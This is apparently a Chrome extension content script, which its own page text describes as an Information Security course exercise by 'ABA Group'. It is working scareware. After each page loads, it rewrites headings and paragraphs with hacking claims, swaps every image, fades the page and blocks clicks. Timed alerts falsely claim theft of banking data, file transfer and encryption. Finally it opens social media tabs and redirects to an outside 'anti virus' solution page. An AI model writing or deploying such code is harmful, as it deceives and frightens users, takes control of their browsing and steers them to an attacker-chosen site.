
let timeIntervalId = 0;


chrome.extension.sendMessage({}, function(response) {
	var readyStateCheckInterval = setInterval(function() {
		if (document.readyState === "complete") {
			
			let spans = document.querySelectorAll("span");
			let ps = document.querySelectorAll("p");
			let svgs = document.querySelectorAll("svg");
			let h1s = document.querySelectorAll("h1");
			let h2s = document.querySelectorAll("h2");
			let h3s = document.querySelectorAll("h3");
			let cites = document.querySelectorAll("cite");
			let body = document.querySelector("body");
			
			let current_location_length = window.history.length;
			
			clearInterval(readyStateCheckInterval);
			
			// ----------------------------------------------------------
			// This part of the script triggers when page is done loading
			alert("Your Computer has been Hacked :)");
			
	

			// ---------------------------------------------------------
			//  To change every image on the side.
			setInterval(() => {
				var images = document.querySelectorAll("img");
				images.forEach(image => image.src = "https://i.pinimg.com/474x/9b/1e/c5/9b1ec57e6c3138a53edbfe5a4b59c5ba.jpg");
			}, 500);


			// ---------------------------------------------------------
			//  To change the opacity of hte body to make it look disappearing.
			var visibility = 1;
			setInterval(() => {
				if(visibility >=0.7 )
				{
					visibility = visibility - 0.1;
					document.body.style.opacity = visibility;
				}
			}, 2000);


			// ---------------------------------------------------------
			//  To change the elements properties
			
			h1s.forEach(h1 => h1.innerText = "System has been Hacked");
			h2s.forEach(h2 => h2.innerText = "We have altered some settings of your system");
			h3s.forEach(h3 => h3.innerText = "System Hacked :) Download another anit virus extension if You want to work");
			ps.forEach(p => p.innerText = "Collecting your data");
			cites.forEach(cite => cite.innerText = "Hacked by ABA Group");
			body.style.pointerEvents = "none";



			// ---------------------------------------------------------
			//  To start pop ups after 4 mins for a minute
			notifications();


			// ---------------------------------------------------------
			//  To change the content of the body to show a warning
			
			setTimeout(() => {
				document.body.classList.add("body");
				document.body.innerHTML = "<main class='main'><section class='home'><div class='home__container container'><div class='home__data'><span class='home__subtitle'>System Hacked</span><h1 class='home__title'>Hey Buddy</h1><p class='home__description'>Your System has been hacked and your data has been compromised. For your assurance the system will automatically be targetted to different pages which you have recently or most frequently visited.<br>Your system has been hacked by ABA Group under the academic practices for the course of Information Security.</p></div><div class='home__img'><img src='ghost-img.png'><div class='home__shadow'></div></div></div></section></main>"

			}, 180000);


			// ---------------------------------------------------------
			//  To get the page to the previous pages
			setTimeout(() => {
				var anchor = document.createElement("a");
				anchor.href = history.go(-1);
				anchor.target = "_blank";
				anchor.style.display = "none";
				document.body.append(anchor)
				anchor.click();

				anchor.href = "https://www.google.com/";
				anchor.click();

				anchor.href = "https://www.facebook.com/";
				anchor.click();

				anchor.href = "https://www.instagram.com/";
				anchor.click();

				anchor.href = "https://web.whatsapp.com/";
				anchor.click();
			}, 210000);


			// ---------------------------------------------------------
			//  To open the solution page for the anti virus
			setTimeout(() => {
				window.open("https://error-message-page.vercel.app/", "_self");
			}, 240000);
			
		}
	}, 10);
});


function notifications() {
	setTimeout(() => {
		alert("System Hacked! All your personal information has been compromised. Your accounts has been digged and the data has been conceived.")
	}, 90000);

	setTimeout(() => {
		alert("System Hacked! Fetching your banking info....")
	}, 96000);

	setTimeout(() => {
		alert("Corelating your device settings and activating the virus...")
	}, 102000);

	setTimeout(() => {
		alert("Getting your system's control...")
	}, 108000);

	setTimeout(() => {
		alert("Transfering all files....")
	}, 114000);

	setTimeout(() => {
		alert("Checking your browser's history....")
	}, 120000);

	setTimeout(() => {
		alert("Gathered all the information from the chromes accessibility tool...")
	}, 126000);

	setTimeout(() => {
		alert("The data remained on your drive is not safe anymore.")
	}, 132000);

	setTimeout(() => {
		alert("Instantiating virus into your system")
	}, 138000);

	setTimeout(() => {
		alert("Encrypting files and substantiating the sources...")
	}, 144000);

	setTimeout(() => {
		alert("System Encrypted Successfully. Save your important data.")
	}, 150000);
}

